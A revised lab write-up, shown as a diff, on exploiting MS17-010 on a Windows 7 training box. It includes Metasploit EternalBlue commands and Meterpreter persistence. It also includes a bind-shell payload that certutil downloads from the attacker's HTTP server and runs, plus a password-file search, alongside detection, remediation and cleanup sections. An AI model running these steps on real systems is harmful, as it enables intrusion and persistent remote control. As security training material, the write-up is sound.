@@ -1,109 +1,389 @@
-# CTF Writeup: Blue (TCM Security)
+# Blue: Exploiting MS17-010 in a Windows 7 Lab
 
-***Date***:09/20/2024
+> **Historical write-up:** This assessment was originally completed in
+> September 2024 while I was developing my penetration-testing methodology.
+> It was revised in August 2026 to correct technical terminology, improve
+> evidence handling, and add detection, remediation, and cleanup analysis.
+
+- **Original completion date:** September 20, 2024
+- **Revision date:** August 2026
+- **Environment:** Authorized training lab
 
 ---
+
 ## Table of Contents
-- Challenge Description
-- Challenge Information
-- Reconnaissance and Exploitation
-- Lessons Learned
+
+- [Challenge Information](#challenge-information)
+- [Executive Summary](#executive-summary)
+- [Reconnaissance](#reconnaissance)
+- [MS17-010 Validation](#ms17-010-validation)
+- [Exploitation](#exploitation)
+- [Access Validation](#access-validation)
+- [Persistence](#persistence)
+- [Alternative Payload Transfer Demonstration](#alternative-payload-transfer-demonstration)
+- [Detection Opportunities](#detection-opportunities)
+- [Remediation](#remediation)
+- [Cleanup](#cleanup)
+- [Retrospective](#retrospective)
+- [Key Takeaways](#key-takeaways)
+- [References](#references)
 
 ---
 
-## Challenge Description
-Enumerate and exploit a Windows 7 machine, and establish persistence. 
 ## Challenge Information
+
 - **Name:** Blue
-- **Category:** Windows 7, Network, Operating System
+- **Platform:** TCM Security
 - **Difficulty:** Easy
-- **CTF Platform:** TCM Security
+- **Target:** Windows 7
+- **Primary service:** Server Message Block
+- **Primary vulnerability:** MS17-010
+- **Objective:** Enumerate and exploit the target, obtain privileged access, and demonstrate persistence.
 
 ---
 
-## Reconnaissance and Exploitation
+## Executive Summary
 
-To begin, I made sure the machine was alive through a ping. Seeing it was alive, I moved on to an Nmap scan. 
-```nmap -sV -A -Pn -p- -O2 192.168.81.133```
+The target was a Windows 7 system exposing Server Message Block, or SMB, on TCP port 445. Enumeration indicated that SMBv1 was enabled and that the system was consistent with hosts affected by MS17-010.
 
-The flags seek to determine services on the machine, run available scripts against those machines, disable ping sweep, and scan all ports and not only the common ones. Through this, I found a bunch of services running on the machine. 
+The vulnerability was exploited within the authorized lab environment, resulting in remote code execution with `NT AUTHORITY\SYSTEM` privileges. Post-exploitation validation confirmed that the session belonged to the intended target. A persistence mechanism was then demonstrated because persistence was an explicit lab objective.
 
-![Pasted image 20240920160411](https://github.com/user-attachments/assets/a1f6004f-cbce-41ce-b87c-1a878e59510d)
+In a production environment, successful exploitation could result in complete host compromise, credential theft, lateral movement, persistence, data destruction, or malware deployment.
 
-Below are the results from my Nmap Scan-
-```
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-dsS Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
+---
+
+## Reconnaissance
+
+I first confirmed that the target was reachable before beginning service enumeration.
+
+The original notes recorded the following Nmap command:
+
+```bash
+nmap -sV -A -Pn -p- -O2 192.168.81.133
 ```
 
-From here, I went through Metasploit and the Web through each service to identify exploits. I found a module in Metasploit that performed enumeration on SMB to find which version it is running, scanner/smb/smb_version. I found that SMB was running 1.2, which is vulnerable to EternalBlue, a exploit in Microsoft's implementation of the SMB protocol that was infamously used by the WannaCry ransomware. It allows remote attackers to execute arbitrary code by sending crafted messages to the vulnerable machine's SMBv1 service.
- I decided to go with this one because it is extremely effective against that version of SMB, being an 8.1 CVSS score, and it would allow me to execute code remotely. I searched it up on Metasploit and found an exploit, exploit/windows/smb/ms17_010_eternalblue, and used that. 
+The `-O2` argument appears to have been a documentation error. A cleaner equivalent scan would be:
 
-I take a look at my options through the show options command. From here, I manage my options:
+```bash
+nmap -Pn -p- -sC -sV -O 192.168.81.133
 ```
-set rhost 192.168.81.133
-set rport 445
-exploit. 
+
+The corrected options perform the following actions:
+
+- `-Pn` treats the target as online without relying on host discovery.
+- `-p-` scans all TCP ports.
+- `-sC` runs Nmap's default script set against discovered services.
+- `-sV` performs service-version detection.
+- `-O` attempts operating-system detection.
+
+![Initial Nmap scan results](https://github.com/user-attachments/assets/a1f6004f-cbce-41ce-b87c-1a878e59510d)
+
+The scan identified SMB on TCP port 445, NetBIOS on TCP port 139, and several Windows RPC endpoints.
+
+```text
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Ultimate 7601 Service Pack 1
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
 ```
-After a couple tries, the script works and I land on a Meterpreter shell. 
 
-![Pasted image 20240920162915](https://github.com/user-attachments/assets/4c8755d6-28da-4bba-94e1-a2c91cdbb926)
+The combination of Windows 7 Service Pack 1 and an exposed SMB service made MS17-010 an appropriate vulnerability to investigate.
 
-From here, I run the commands systeminfo and ipconfig to ensure I am on the correct machine.  Ipconfig will list out the IP address of the machine, while systeminfo will spit out alot of relevant information about the machine, including Architecture, Operation System, Version, and more. One of my favorite one liners, discovered while going through the TCM course, ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"```, gives you the meat and potatoes of what you need: OS Name, Version, and the Architecture. 
+---
 
-I run some other enumeration commands, including:
--  `whoami` - Shows the current user or service account you are running as.
-- `wmic logicaldisk get caption,description,providername` - Lists out the drives on the system, giving an overview of available file systems.
-- `findstr /si password *.txt` - Searches the system for any files containing the word "password" in an attempt to find clear text credentials.
+## MS17-010 Validation
 
+MS17-010 was selected as the primary exploitation path because:
 
-Enumeration is the king of Penetration Testing. You can never have too much information. 
-If there was a flag objective, I would move on here to looking around the file system and seeing what things are around. Given the fact the objective is a simple exploit and not a flag, I move on to Persistence. 
+1. SMB was reachable on TCP port 445.
+2. The operating system and service configuration were consistent with affected systems.
+3. The target was using an unsupported legacy Windows version.
+4. Successful exploitation would satisfy the lab objective without requiring unrelated attack paths.
 
-If SSH, Telnet, or some other remote access tool was on, I would simply create a new user. However, as these are disabled, I opted to establish a backdoor. I simply used the built-in exploit/windows/local/persistence in my Meterpreter prompt. From here, I simply established my options, which port I preferred, and the type of shell. 
+A vulnerability-specific Nmap check can be used to determine whether the host appears exposed:
 
-![Pasted image 20240920162915](https://github.com/user-attachments/assets/560881e6-fccc-4ce3-89f8-c9269bcde434)
+```bash
+nmap -Pn -p445 --script smb-vuln-ms17-010 192.168.81.133
+```
 
-I then set up a netcat on my own machine to listen for the callback.
+The original 2024 notes did not preserve the complete output from this validation step. This was a documentation weakness in the initial assessment.
 
-![Pasted image 20240920163851](https://github.com/user-attachments/assets/6f8af57f-14e8-459f-8fdf-4f5e69a7cd2d)
+In a real engagement, the output from the vulnerability-specific check would be saved as evidence before exploitation. Vulnerability identification, vulnerability validation, and successful exploitation should be documented as separate steps.
 
-Once the machine reboots, it'll reach out to me here and I'll have a shell. 
+Other exposed services would also remain documented for later testing as time and scope permitted. However, discovering a validated, high-impact path does not require delaying exploitation merely to accumulate additional exploit options.
 
-If Metasploit wasn't available, I have some other options. I could've used a combination of setting up a server and certutil in order to download the shell onto the machine.
+---
 
-First, I would set up a server on my machine using the common python3 library http.server.
-```python3 -m http.server 80```
+## Exploitation
 
-After that, I would create a backdoor using Msfconsole, as so:
-```msfvenom -p windows/shell_bind_tcp LHOST=192.168.81.131 LPORT=1231 -f exe > prompt.exe```
-I'm using a Stageless Payload because of the fact that in a backdoor you want it all sent at once, rather than a Staged payload, which splits it up. I am also using the non-traditional 1231 port rather than 4444 to hopefully circumvent firewall rules. 4444 is the default port for Metasploit, and any firewall worth its salt would block traffic on that port. By choosing a less common port, I hoped to evade such rules.
+The Metasploit EternalBlue module was selected to exploit MS17-010.
 
-From here, as I am now hosting this file, I would go to my RCE Shell and use certutil, a tool commonly exploited to transfer files, to download the prompt.
-```certutil -urlcache -split -f "http://192.168.81.131:80/bind.exe" prompt.exe```
+```text
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.81.133
+set RPORT 445
+show options
+check
+run
+```
 
-I drop from my Meterpreter shell and start the executable. 
+The initial attempt did not immediately return a session. After retrying the module, exploitation succeeded and created a Meterpreter session.
 
-![Pasted image 20240920175020](https://github.com/user-attachments/assets/5909f3d5-dc40-4923-ad66-5eb2fe282ae7)
+![Successful Meterpreter session](https://github.com/user-attachments/assets/4c8755d6-28da-4bba-94e1-a2c91cdbb926)
 
-I then Netcat into the machine;
+A failed initial attempt does not necessarily establish that the target is not vulnerable. Exploit reliability can be affected by target state, memory conditions, payload selection, network stability, and implementation behavior. Repeated attempts should still remain proportionate to scope and operational risk.
 
-![Pasted image 20240920175601](https://github.com/user-attachments/assets/a8767b71-a610-492b-aa77-d139f8ede27e)
+---
 
-And there you have it! A working backdoor. 
-## Lessons Learned
-One of the largest mistakes I had was not properly vetting the other services. Once I saw the SMB Vulnerability, I went straight for it without a second thought. I should've gone through the rest of the services and stockpiled a few different exploits before I started trying to get into the box. I also could've used tools like Smbclient on SMB rather than relying on Metasploit. 
+## Access Validation
 
-Another big pitfall that I had was my notetaking. I was on top of it to begin with but once I exploited the machine and ran post-exploitation I started letting it slack. I shouldn't have had to go back in my machine to pull the screenshots for this Write-Up, as I should've taken them all as the discoveries happened. 
+After obtaining a session, I validated that the connection belonged to the intended target and determined the privilege level of the session.
 
-**Key Takeaways:**
-- Always conduct thorough reconnaissance and explore multiple service vulnerabilities instead of jumping to the first one discovered.
-- Maintain detailed and organized notes throughout the entire process to avoid backtracking.
-- Use multiple tools in your enumeration
+```cmd
+whoami
+hostname
+ipconfig
+systeminfo
+```
+
+These commands established:
+
+- The current security context
+- The target hostname
+- The system's IP configuration
+- The operating-system version
+- The processor architecture
+
+The session was running as:
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+This represented complete administrative control of the Windows host.
+
+Post-exploitation commands should support a specific conclusion. Running large numbers of commands without a defined purpose creates unnecessary traffic, increases operational risk, and makes assessment notes more difficult to interpret.
+
+---
+
+## Persistence
+
+Because the lab objective specifically required demonstrating persistence, I continued beyond initial access.
+
+In a real assessment, persistence would only be established when explicitly authorized by the rules of engagement. Creating accounts, services, scheduled tasks, registry entries, startup items, or payloads would constitute material changes to the target.
+
+The Meterpreter persistence module was used to establish a mechanism that would attempt to reconnect after the system restarted.
+
+```text
+run persistence
+```
+
+The exact module options should be reviewed and documented before execution, including:
+
+- Callback address
+- Callback port
+- Execution interval
+- Persistence location
+- Artifacts created on the target
+- Cleanup procedure
+
+![Persistence module configuration](https://github.com/user-attachments/assets/560881e6-fccc-4ce3-89f8-c9269bcde434)
+
+A handler was then configured on the assessment system to receive the callback.
+
+![Handler waiting for callback](https://github.com/user-attachments/assets/6f8af57f-14e8-459f-8df4-f5e69a7cd2d)
+
+After the target rebooted, the persistence mechanism attempted to reconnect to the configured listener.
+
+This demonstrated the lab objective, but it also created artifacts that would need to be identified and removed during cleanup.
+
+---
+
+## Alternative Payload Transfer Demonstration
+
+As an alternative to relying on the existing Meterpreter session, a standalone payload could be transferred to the target using a temporary HTTP server and a built-in Windows utility.
+
+For this demonstration, a bind-shell payload is used.
+
+Unlike a reverse shell, a bind shell opens a listening port on the target. The assessment system then connects directly to that port. Because the payload does not call back to the assessment system, it does not require an `LHOST` value.
+
+### Payload Generation
+
+```bash
+msfvenom -p windows/shell_bind_tcp LPORT=1231 -f exe -o prompt.exe
+```
+
+A single-stage payload was used to keep the lab demonstration simple. Staged and single-stage payloads each have operational tradeoffs, and the appropriate choice depends on the environment and engagement requirements.
+
+### File Hosting
+
+A temporary HTTP server was started from the directory containing the payload:
+
+```bash
+python3 -m http.server 80
+```
+
+### File Transfer
+
+From the compromised Windows host, `certutil.exe` was used to retrieve the payload:
+
+```cmd
+certutil -urlcache -split -f "http://192.168.81.131/prompt.exe" prompt.exe
+```
+
+The filename remained consistent throughout payload generation, hosting, transfer, and execution.
+
+After the transfer completed, the payload was executed on the target:
+
+```cmd
+prompt.exe
+```
+
+![Bind-shell payload execution](https://github.com/user-attachments/assets/5909f3d5-dc40-4923-ad66-5eb2fe282ae7)
+
+The assessment system then connected to the listening port:
+
+```bash
+nc 192.168.81.133 1231
+```
+
+![Connection to the bind shell](https://github.com/user-attachments/assets/a8767b71-a610-492b-aa77-d139f8ede27e)
+
+This established a command shell on the target.
+
+Changing the listener from a commonly used port such as 4444 to another port does not make the payload inherently stealthy and does not guarantee that it will bypass security controls. Modern defenses may inspect:
+
+- Process behavior
+- File reputation
+- Payload signatures
+- Parent-child process relationships
+- Network direction
+- Connection patterns
+- Endpoint telemetry
+- Application-control policy violations
+
+A host firewall could also prevent the inbound connection to the bind shell.
+
+---
+
+## Detection Opportunities
+
+Potential indicators associated with this attack chain include:
+
+- External connections to TCP port 445
+- SMBv1 negotiation
+- Network signatures associated with MS17-010 exploitation
+- Unexpected child processes associated with the SMB service
+- Meterpreter or generated payload execution
+- `certutil.exe` retrieving content from an unusual HTTP server
+- Executables written to uncommon locations
+- New services, scheduled tasks, startup entries, or registry persistence
+- Connections to uncommon listening ports
+- A Windows host unexpectedly running an HTTP-downloaded executable
+- Post-exploitation commands executed from an unusual process tree
+
+Useful telemetry could include:
+
+- Windows process-creation auditing
+- Sysmon process-creation events
+- Sysmon network-connection events
+- Windows SMB logs
+- Endpoint detection and response telemetry
+- Host-firewall logs
+- Network IDS or IPS alerts
+- Web proxy logs
+- File-creation events
+- Service and scheduled-task creation logs
+
+Detection should focus on the complete behavior chain rather than relying only on a specific filename, port number, or payload signature.
+
+---
+
+## Remediation
+
+The primary remediation is to install the Microsoft security updates that address MS17-010 and disable SMBv1 where it is not explicitly required.
+
+Additional controls include:
+
+- Replacing unsupported operating systems
+- Restricting SMB access with host and network firewalls
+- Blocking direct workstation-to-workstation SMB where unnecessary
+- Segmenting legacy systems from sensitive networks
+- Limiting access to TCP ports 139 and 445
+- Applying application-control policies
+- Monitoring use of administrative utilities such as `certutil.exe`
+- Preventing execution from user-writable and temporary directories
+- Maintaining current endpoint protection
+- Monitoring for unexpected service or scheduled-task creation
+- Removing unnecessary network services
+- Conducting regular authenticated vulnerability assessments
+
+The strongest remediation is eliminating the vulnerable legacy system rather than relying indefinitely on compensating controls.
+
+---
+
+## Cleanup
+
+Persistence and payload deployment were performed only because they were part of the authorized lab objective.
+
+After validating the objective, the following artifacts should be removed:
+
+- The transferred `prompt.exe` payload
+- Files generated by the persistence module
+- Registry entries created for persistence
+- Services or scheduled tasks created for persistence
+- Temporary payload-hosting files
+- Metasploit handlers
+- Netcat listeners
+- Any additional files created during testing
+
+---
+
+## Retrospective
+
+This was one of my earlier penetration-testing labs. The technical attack path was successful, but the original documentation had several weaknesses.
+
+The original version:
+
+- Did not clearly distinguish service identification from vulnerability validation
+- Contained an incorrect or mistyped Nmap argument
+- Used inconsistent payload filenames
+- Mixed bind-shell and reverse-shell terminology
+- Included an unnecessary `LHOST` value for a bind payload
+- Recorded commands without consistently explaining the decisions they supported
+- Underemphasized authorization, cleanup, detection, and remediation
+- Suggested that accumulating multiple exploits was inherently better than validating the most appropriate path
+- Did not preserve complete evidence from the vulnerability-validation step
+- Did not maintain a complete record of artifacts created on the target
+
+The revised write-up focuses on evidence, decision-making, technical accuracy, and the complete assessment lifecycle rather than simply obtaining a shell.
+
+---
+
+## Key Takeaways
+
+- Service identification, vulnerability validation, and successful exploitation are separate evidentiary steps.
+- Exact commands, filenames, payload behavior, and results should be recorded while testing occurs.
+- Every command should support a defined assessment objective or conclusion.
+- A validated high-impact vulnerability can be prioritized without first collecting multiple unnecessary exploit paths.
+- Persistence and system modification require explicit authorization.
+- Bind shells and reverse shells have different network behaviors and configuration requirements.
+- Changing a payload's port does not inherently make it stealthy.
+- Offensive write-ups should include detection and remediation analysis.
+- Every modified system should have an artifact log and verified cleanup process.
+- Historical technical work can remain valuable when errors are corrected transparently.
+
+---
+
+## References
+
+- Microsoft Security Bulletin MS17-010
+- Nmap Reference Guide
+- Rapid7 Metasploit MS17-010 EternalBlue Module Documentation
+- MITRE ATT&CK
+- Microsoft Sysinternals Sysmon Documentation
